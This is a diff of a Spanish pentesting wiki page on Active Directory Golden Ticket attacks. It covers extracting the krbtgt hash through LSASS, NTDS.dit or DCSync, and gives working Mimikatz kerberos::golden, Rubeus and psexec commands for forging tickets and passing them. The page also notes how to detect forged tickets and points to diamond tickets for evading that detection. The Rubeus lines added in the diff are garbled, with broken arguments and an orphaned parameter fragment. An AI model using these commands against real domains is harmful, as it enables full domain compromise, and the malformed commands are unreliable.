@@ -4,9 +4,9 @@
 
 ## Golden ticket
 
-Un ataque de **Golden Ticket** consiste en la **creación de un Ticket Granting Ticket (TGT) legítimo impersonando a cualquier usuario** a través del uso del **hash NTLM de la cuenta krbtgt de Active Directory (AD)**. Esta técnica es particularmente ventajosa porque **permite el acceso a cualquier servicio o máquina** dentro del dominio como el usuario impersonado. Es crucial recordar que las **credenciales de la cuenta krbtgt nunca se actualizan automáticamente**.
+Un **ataque de Golden Ticket** consiste en la **creación de un Ticket Granting Ticket (TGT) legítimo impersonando a cualquier usuario** a través del uso del **hash NTLM de la cuenta krbtgt de Active Directory (AD)**. Esta técnica es particularmente ventajosa porque **permite el acceso a cualquier servicio o máquina** dentro del dominio como el usuario impersonado. Es crucial recordar que las **credenciales de la cuenta krbtgt nunca se actualizan automáticamente**.
 
-Para **adquirir el hash NTLM** de la cuenta krbtgt, se pueden emplear varios métodos. Puede ser extraído del **proceso de Local Security Authority Subsystem Service (LSASS)** o del **archivo NT Directory Services (NTDS.dit)** ubicado en cualquier Controlador de Dominio (DC) dentro del dominio. Además, **ejecutar un ataque DCsync** es otra estrategia para obtener este hash NTLM, que se puede realizar utilizando herramientas como el **módulo lsadump::dcsync** en Mimikatz o el **script secretsdump.py** de Impacket. Es importante subrayar que para llevar a cabo estas operaciones, **normalmente se requieren privilegios de administrador de dominio o un nivel de acceso similar**.
+Para **adquirir el hash NTLM** de la cuenta krbtgt, se pueden emplear varios métodos. Puede ser extraído del **proceso del Servicio de Subsistema de Seguridad Local (LSASS)** o del **archivo de Servicios de Directorio NT (NTDS.dit)** ubicado en cualquier Controlador de Dominio (DC) dentro del dominio. Además, **ejecutar un ataque DCsync** es otra estrategia para obtener este hash NTLM, que se puede realizar utilizando herramientas como el **módulo lsadump::dcsync** en Mimikatz o el **script secretsdump.py** de Impacket. Es importante subrayar que para llevar a cabo estas operaciones, **normalmente se requieren privilegios de administrador de dominio o un nivel de acceso similar**.
 
 Aunque el hash NTLM sirve como un método viable para este propósito, se **recomienda encarecidamente** **forjar tickets utilizando las claves Kerberos del Estándar de Cifrado Avanzado (AES) (AES128 y AES256)** por razones de seguridad operativa.
 ```bash:From Linux
@@ -16,6 +16,12 @@ python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
 ```
 
 ```bash:From Windows
+# Rubeus
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+.\Rubeus.exe asktgt /user:Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+/rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /ptt
 #mimikatz
 kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
 .\Rubeus.exe ptt /ticket:ticket.kirbi
@@ -32,13 +38,13 @@ Las formas más frecuentes de detectar un golden ticket son **inspeccionando el 
 
 `Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`
 
-Utiliza los parámetros `/startoffset`, `/endin` y `/renewmax` para controlar el desplazamiento de inicio, la duración y las renovaciones máximas (todas en minutos).
+Utiliza los parámetros `/startoffset`, `/endin` y `/renewmax` para controlar el desplazamiento de inicio, la duración y las renovaciones máximas (todo en minutos).
 ```
 Get-DomainPolicy | select -expand KerberosPolicy
 ```
-Desafortunadamente, la duración del TGT no se registra en los 4769, por lo que no encontrarás esta información en los registros de eventos de Windows. Sin embargo, lo que puedes correlacionar es **ver 4769 sin un previo 4768**. **No es posible solicitar un TGS sin un TGT**, y si no hay registro de que se haya emitido un TGT, podemos inferir que fue forjado fuera de línea.
+Desafortunadamente, la duración del TGT no se registra en el 4769, por lo que no encontrarás esta información en los registros de eventos de Windows. Sin embargo, lo que puedes correlacionar es **ver 4769 sin un previo 4768**. **No es posible solicitar un TGS sin un TGT**, y si no hay registro de que se haya emitido un TGT, podemos inferir que fue forjado fuera de línea.
 
-Para **eludir esta detección**, verifica los diamond tickets:
+Para **eludir esta detección**, revisa los diamond tickets:
 
 {{#ref}}
 diamond-ticket.md
